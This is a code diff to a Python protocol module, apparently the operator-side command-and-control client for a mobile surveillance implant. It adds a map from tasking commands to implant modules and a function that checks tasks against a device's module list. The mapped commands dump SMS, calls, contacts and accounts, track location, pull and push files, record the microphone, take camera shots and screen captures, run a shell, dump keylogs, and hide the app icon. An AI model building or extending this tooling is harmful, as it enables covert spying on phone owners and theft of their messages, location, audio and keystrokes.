@@ -18,7 +18,7 @@ import hmac
 import json
 import os
 import uuid
-from typing import Any, Dict
+from typing import Any, Dict, List, Optional
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
@@ -78,8 +78,35 @@ COMMANDS = (
     "screen_start",
     "screen_stop",
     "watch_add",
-    "contacts_dump",
+    "spec",
+    "modules",
 )
+
+
+# Command → module. Mirrors Dispatcher.moduleFor in the implant so a client can
+# refuse out-of-spec tasks before they ever reach a device.
+COMMAND_MODULE = {
+    "sms_dump": "sms", "sms_send": "sms",
+    "calls_dump": "calls",
+    "contacts_dump": "contacts", "accounts": "contacts",
+    "loc": "loc", "loc_track": "loc",
+    "files_ls": "files", "files_pull": "files", "files_push": "files",
+    "clipboard_get": "clip", "clipboard_set": "clip",
+    "notif_dump": "notif",
+    "mic_rec": "mic",
+    "cam_shot": "cam",
+    "screenshot": "screen", "screen_start": "screen", "screen_stop": "screen",
+    "shell": "shell",
+    "keylog_dump": "keylog", "keylog_clear": "keylog",
+    "wifi_dump": "wifi",
+    "usage": "usage",
+    "apps": "apps",
+    "native_state": "native", "native_probe": "native", "watch_start": "native",
+    "watch_add": "native", "watch_drain": "native",
+}
+CORE_COMMANDS = frozenset({
+    "ping", "info", "perm_status", "spec", "modules", "hide_icon", "toast", "vibrate", "open_url",
+})
 
 
 class ProtocolError(Exception):
@@ -158,6 +185,19 @@ def pack(body: Dict[str, Any]) -> bytes:
 
 def new_sid() -> str:
     return str(uuid.uuid4())
+
+
+def module_of(cmd: str) -> str:
+    return COMMAND_MODULE.get(cmd, "other")
+
+
+def allowed(cmd: str, modules: Optional[List[str]]) -> bool:
+    """True when the command runs under the given spec module list."""
+    if cmd in CORE_COMMANDS:
+        return True
+    if modules is None:
+        return True
+    return module_of(cmd) in modules
 
 
 def validate_task(task: Dict[str, Any]) -> Dict[str, Any]:
